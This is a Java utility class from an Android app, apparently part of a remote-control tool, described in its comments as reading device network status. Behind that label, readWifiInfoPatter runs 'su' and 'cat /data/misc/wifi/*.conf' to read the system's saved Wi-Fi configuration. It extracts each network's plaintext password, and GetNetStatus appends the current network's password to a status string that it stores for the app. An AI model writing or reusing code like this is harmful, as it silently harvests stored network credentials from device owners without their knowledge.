package com.lfish.control.action.actiontool;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.lfish.control.utils.MyLog;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by shenmegui on 2017/9/11.
 */
public class WifiUtils {

    /**
     * Get device net flag
     */
    private static String isFastMobileNetwork(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        switch (telephonyManager.getNetworkType()) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
            case TelephonyManager.NETWORK_TYPE_EDGE:
            case TelephonyManager.NETWORK_TYPE_CDMA:
            case TelephonyManager.NETWORK_TYPE_1xRTT:
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return ShareUtils.NETWOKR_TYPE_2G;
            case TelephonyManager.NETWORK_TYPE_UMTS:
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
            case TelephonyManager.NETWORK_TYPE_HSDPA:
            case TelephonyManager.NETWORK_TYPE_HSUPA:
            case TelephonyManager.NETWORK_TYPE_HSPA:
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
            case TelephonyManager.NETWORK_TYPE_EHRPD:
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return ShareUtils.netStatus_default;
            case TelephonyManager.NETWORK_TYPE_LTE:
                return ShareUtils.NETWOKR_TYPE_4G;
            default:
                return ShareUtils.netStatus_default;
        }
    }
    /**
     * Get device net status
     */
    public static String GetNetStatus(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo info = connectivityManager.getActiveNetworkInfo();
            if (info != null && info.isAvailable()) {
                String name = info.getTypeName();
                if (!name.equals(ShareUtils.NETWORK_TYPE_WIFI)) {
                    name = isFastMobileNetwork(context);
                }else{
                    WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    name = name+":"+wifiInfo.getSSID();

                    try {
                        WifiInfoLocal wifiInfoLocal = readWifiInfoPatter().get(wifiInfo.getSSID());
                        if(wifiInfoLocal!=null){
                            name = name+" 密码:"+wifiInfoLocal.password;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
                ShareUtils.putString(context, ShareUtils.Config, ShareUtils.netStatus, name);
//				Intent intent1 = new Intent();
//				intent1.setClass(context, CoreService.class);
//				context.startService(intent1);
                MyLog.d("mark", "current netstatus" + name);
                return name;
            } else {
                ShareUtils.putString(context, ShareUtils.Config, ShareUtils.netStatus, "");
                MyLog.d("mark", "no avalid network");
                return "";
            }
        } else {
            return "";
        }
    }

    public static Map<String,WifiInfoLocal> readWifiInfoPatter() throws Exception {
        Map<String,WifiInfoLocal> wifiInfos=new HashMap<String,WifiInfoLocal>();

        Process process = null;
        DataOutputStream dataOutputStream = null;
        DataInputStream dataInputStream = null;
        StringBuffer wifiConf = new StringBuffer();
        try {
            process = Runtime.getRuntime().exec("su");
            dataOutputStream = new DataOutputStream(process.getOutputStream());
            dataInputStream = new DataInputStream(process.getInputStream());
            dataOutputStream
                    .writeBytes("cat /data/misc/wifi/*.conf\n");
            dataOutputStream.writeBytes("exit\n");
            dataOutputStream.flush();
            InputStreamReader inputStreamReader = new InputStreamReader(
                    dataInputStream, "UTF-8");
            BufferedReader bufferedReader = new BufferedReader(
                    inputStreamReader);
            String line = null;
            while ((line = bufferedReader.readLine()) != null) {
                wifiConf.append(line);
            }
            bufferedReader.close();
            inputStreamReader.close();
            process.waitFor();
        } catch (Exception e) {
            throw e;
        } finally {
            try {
                if (dataOutputStream != null) {
                    dataOutputStream.close();
                }
                if (dataInputStream != null) {
                    dataInputStream.close();
                }
                process.destroy();
            } catch (Exception e) {
                throw e;
            }
        }


        Pattern network = Pattern.compile("network=\\{([^\\}]+)\\}", Pattern.DOTALL);
        Matcher networkMatcher = network.matcher(wifiConf.toString() );
        while (networkMatcher.find() ) {
            String networkBlock = networkMatcher.group();
            Pattern ssid = Pattern.compile("ssid=\"([^\"]+)\"");
            Matcher ssidMatcher = ssid.matcher(networkBlock);

            if (ssidMatcher.find() ) {
                WifiInfoLocal wifiInfo=new WifiInfoLocal();
                wifiInfo.ssid=ssidMatcher.group(1);
                Log.i("" +
                        ".class",wifiInfo.ssid);
                Pattern psk = Pattern.compile("psk=\"([^\"]+)\"");
                Matcher pskMatcher = psk.matcher(networkBlock);
                if (pskMatcher.find() ) {
                    wifiInfo.password=pskMatcher.group(1);
                } else {
                    wifiInfo.password="无密码";
                }
                wifiInfos.put(wifiInfo.ssid,wifiInfo);
            }
        }

        return wifiInfos;
    }

    public static class WifiInfoLocal {
        public String ssid="";
        public String password="";
    }
}
